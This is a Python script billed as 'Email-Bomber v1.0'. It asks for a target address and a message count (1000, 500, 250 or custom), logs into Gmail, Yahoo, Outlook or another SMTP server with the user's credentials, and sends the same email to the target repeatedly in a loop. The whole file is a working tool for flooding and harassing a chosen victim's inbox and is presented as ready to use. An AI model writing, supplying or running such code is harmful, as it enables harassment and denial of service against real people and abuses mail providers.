'''imports'''
import smtplib
import sys


class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


def banner():
    print(bcolors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+')
    print(bcolors.GREEN + '+[+[+[ made with codes ]+]+]+')
    print(bcolors.GREEN + '''
                                .!JY5J.               
                           7B57~~~                
                          J&!                     
                     .:::?@!                      
                    ^#&&&@@##BJ                   
                 :!?G@@@@@@@@@&?~.                
              ^JG&@@@@@@@@@@@@@@@&G?:             
            ~P@@@@@@@@@@@@@@@@@@@@@@&5^           
          .5@@@@@@@@@@@@@@@@@@@@@@@@@@@Y          
         :B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@G.        
        .B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@G        
        J@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@?       
        #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@G       
       .&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B       
        B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@P       
        ?@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@!       
         P@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@5        
         .P@@@@@@@@@@@@@@@@@@@@@@@@@@@@@5         
           ?&@@@@@@@@@@@@@@@@@@@@@@@@@#7          
            .J#@@@@@@@@@@@@@@@@@@@@@B?.           
              .!YB&@@@@@@@@@@@@@&BY~              
                  :~?Y5PGGGP5Y?~:                 
                                                                                                      
                                                                                                    
     !BGGGGGGGGB? ?GGGGGGGGB!  :?PB#BGY~   ^GG5:    .PGY 7BGGGGGGGGB7 JGGGGGGGGB^:GG?               
     ^JJJJ??B@@#~ 5@@5?JJJJJ^ J@@BJ??P@@P. ~@@@#~   :@@B ^JJJJ??B@@#^ G@@Y?JJJJJ.~@@P               
           Y@@5.  5@@~       7@@5     7@@5 ~@@&@@J  :@@B      .5@@Y.  P@@^       ~@@5               
         ~#@#!    5@@######7 5@@~     .&@# ~@@57@@G::@@B     !&@#~    P@@######! ~@@5               
       .Y@@5.     5@@Y77777: 5@@!     .&@B ~@@5 ^B@&J&@B   .5@@Y.     P@@J77777: ~@@5               
      ~B@#!       5@@~       ~@@G:   .Y@@? ~@@5  .Y@@@@B  !#@#~       P@@:       ~@@5               
     7@@@#GGGGGG5 5@@BGGGGGB7 ~G@@BPG&@#7  ~@@P    !&@@B J@@@#GGGGGBY G@@BGGGGGB~~@@&GGGGGB!        
     ~J??JJJJJJJ7 ~J?JJJJJJJ~   ^7YYY?~.   :?J~     :?J! !J??JJJJJJJ7 !J?JJJJJJJ^.??JJJJJJJ^                  
                                       ,-.--.
*.______________________________________________________________,' (Bomb)
                                                                    `--' ''')


class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
            self.target = str(input(bcolors.GREEN + 'Enter target email <: '))
            self.mode = int(input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up bomb ]+]+]+')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
            print(bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
            self.server = str(input(bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + 'Enter port number <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: '))
            self.fromPwd = str(input(bcolors.GREEN + 'Enter from password <: '))
            self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
            self.message = str(input(bcolors.GREEN + 'Enter message <: '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(bcolors.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
        sys.exit(0)


if __name__=='__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()